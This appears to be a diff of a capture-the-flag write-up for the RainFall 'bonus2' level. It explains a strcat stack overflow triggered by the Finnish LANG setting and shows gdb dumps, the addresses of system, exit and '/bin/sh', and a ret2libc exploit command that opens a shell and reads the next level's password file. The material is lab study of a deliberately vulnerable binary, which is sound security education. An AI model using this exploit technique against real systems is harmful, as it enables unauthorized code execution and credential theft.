@@ -70,43 +70,36 @@
 
 ### Explanation
 
-The main function takes two arguments and checks an environment variable named `LANG` to determine a language setting.
+The `main()` function takes two arguments and checks for an environment variable named `LANG` to determine a language setting.
 
-The first and second arguments are set into buff_1 (40 bytes max) and buff_2 (32 bytes max)
+The first and second arguments are set into `buff` (`40` bytes max) and `buff2` (`32` bytes max).
+The first argument is going to be passed `greetuser()` that will use `strcat()` to concatenate the paramterer to a string on the stack: `"Goedemiddag!"` if `LANG` is set with `nl`, `"Hyvää päivää"` if `LANG` is set with `fi`, or `"Hello"` by default.
 
-Next the program checks if the env variable  `LANG` is set to "fi" or "nl"
-
-Then the contentis copied into buff_1 memory on the stack (possibly causing a buffer overflow if buff_1 is too large.)
-
-A fucntion named `greetuser()` is called:
-
-3 cases: if `LANG` is set with a value other than "fi" or "nl" the string "Hello" printed.
-         if "nl" is set in the `LANG` variable "Goedemiddag! " is printed
-         if "fi" is set in the `LANG` variable "\x48\x79\x76\xc3\xa4\xc3\xa4\x20\x70\xc3\xa4\x69\x76\xc3\xa4\xc3\xa4\x20" ASCII characters are created printing "Hyvää päivää".
-
-the vulnerability - set a breakpoint on the return address of `greetuser()` function
-
-```sh
-r $(python -c "print('A' * 40)") $(python -c "print('B' * 18 + 'wwwwwwwwwwww')")
-
-
-Breakpoint 3, 0x08048527 in greetuser ()
-(gdb) x/8xw $ebp
-0xbffff638:	0x42424242	0x77777777	0x77777777	0x77777777
-0xbffff648:	0x41414100	0x41414141	0x41414141	0x41414141
+```bash
+(gdb) x/24wx $esp
+0xbffffb70:    0xbffffb80    0xbffffbd0    0x00000001    0x00000000
+0xbffffb80:    0x6c6c6548    0x4141206f    0x41414141    0x41414141
+0xbffffb90:    0x41414141    0x41414141    0x41414141    0x41414141
+0xbffffba0:    0x41414141    0x41414141    0x41414141    0x42424141
+0xbffffbb0:    0x42424242    0x42424242    0x42424242    0x42424242
+0xbffffbc0:    0x77777777    0x77777777    0x77777777    0x08048600
 ```
 
-Perform a ret2libc
+We can see here that `0x41414141` and `0x42424242` are not separated by a null bytes.
+This is because `buff` and `buff1` are stored next to each other in the stack, and if an input bigger than `40` bytes is given to the first `strncpy()`, the string won't end with a null bytes.
 
-```sh
+When the final `strcat()` is called, it will concatenate the `str` and `buff` variables, however because of the lack of null terminated character at the end of `buff`, `buff_1` will also be read by `strcat()`. With the presence of the `18` chars already present in `str` if we are in the `fi` condition, a buffer overflow in `str` will occur and enabling us to overwrite the return address of `greetuser()` and perform a `ret2libc` attack.
+
+```bash
 (gdb) p system
 $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+
 (gdb) p exit
 $2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
+
 (gdb) info proc map
 process 2892
 Mapped address spaces:
-
 	Start Addr   End Addr       Size     Offset objfile
 	 0x8048000  0x8049000     0x1000        0x0 /home/user/bonus2/bonus2
 	 0x8049000  0x804a000     0x1000        0x0 /home/user/bonus2/bonus2
@@ -121,16 +114,18 @@ Mapped address spaces:
 	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
 	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
 	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+
 (gdb) find 0xb7e2c000,0xb8000000,"/bin/sh"
 0xb7f8cc58
-warning: Unable to access target memory at 0xb7fd3160, halting search.
 ```
 
 ## Step 2: Exploiting the Binary
+
 ```bash
 bonus2@RainFall:~$ export LANG=fi
 bonus2@RainFall:~$ ./bonus2 $(python -c "print('A' * 40)") $(python -c "print('B' * 18 + '\xb7\xe6\xb0\x60'[::-1] + '\xb7\xe5\xeb\xe0'[::-1] + '\xb7\xf8\xcc\x58'[::-1])")
 Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB`�����X���
+
 $  cat /home/user/bonus3/.pass         
 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
 ```bash
